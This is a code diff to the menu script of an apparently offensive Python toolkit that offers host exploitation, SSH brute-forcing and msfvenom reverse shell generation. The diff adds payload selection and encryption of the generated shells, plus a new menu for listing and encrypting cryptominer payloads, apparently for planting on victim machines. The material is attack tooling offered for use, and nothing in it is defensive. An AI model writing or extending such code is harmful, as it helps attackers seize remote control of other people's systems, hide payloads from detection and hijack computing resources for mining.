@@ -12,12 +12,8 @@ from modules.exploit import identify_vulnerable_hosts, exploit_vulnerable_hosts
 from modules.utils import clear_all_chunks, split_large_csvs, ensure_wordlists, ensure_valid_hosts
 from modules.bruteforce import load_wordlists, bruteforce_ssh
 from modules.config_handler import configure_settings, load_config
-from modules.shell_generator import (
-    generate_msfvenom_shell,
-    encrypt_shell,
-    decrypt_shell,
-    generate_aes_key,
-)
+from modules.shell_generator import generate_msfvenom_shell, encrypt_generated_shell, list_payloads
+from modules.miner_payload import encrypt_all_cryptominers, list_cryptominers
 import os
 
 def main_menu():
@@ -43,7 +39,8 @@ def main_menu():
         print("15.) SSH Bruteforce")
         print("16.) Configuration Settings")
         print("17.) Generate Reverse Shell")
-        print("18.) Exit")
+        print("18.) Manage Cryptominers")
+        print("19.) Exit")
 
         choice = input("Enter your choice: ")
 
@@ -96,7 +93,21 @@ def main_menu():
             configure_settings()
         elif choice == "17":
             print("\n[ Reverse Shell Generation ]")
-            payload = input("Enter the payload (e.g., windows/meterpreter/reverse_tcp): ").strip()
+            print("Listing available payloads:")
+            payloads = list_payloads()
+            if not payloads:
+                continue
+
+            try:
+                payload_choice = int(input("Select a payload by number: ")) - 1
+                if payload_choice < 0 or payload_choice >= len(payloads):
+                    print("[ERROR] Invalid choice.")
+                    continue
+                payload = payloads[payload_choice]
+            except ValueError:
+                print("[ERROR] Invalid input.")
+                continue
+
             lhost = input("Enter the LHOST (listening IP): ").strip()
             lport = input("Enter the LPORT (listening port): ").strip()
             output_format = input("Enter the output format (e.g., exe, elf, raw): ").strip()
@@ -106,10 +117,23 @@ def main_menu():
             if shell_path:
                 encrypt_choice = input("Do you want to encrypt the shell? (yes/no): ").strip().lower()
                 if encrypt_choice == "yes":
-                    aes_key = generate_aes_key()
-                    encrypt_shell(shell_path, aes_key)
-
+                    encrypt_generated_shell(shell_path)
         elif choice == "18":
+            print("\n[ Cryptominer Management ]")
+            print("1.) List Cryptominers")
+            print("2.) Encrypt All Cryptominers")
+            print("3.) Return to Main Menu")
+
+            miner_choice = input("Enter your choice: ")
+            if miner_choice == "1":
+                list_cryptominers()
+            elif miner_choice == "2":
+                encrypt_all_cryptominers()
+            elif miner_choice == "3":
+                continue
+            else:
+                print("[ERROR] Invalid choice.")
+        elif choice == "19":
             print("[INFO] Exiting.")
             break
         else:
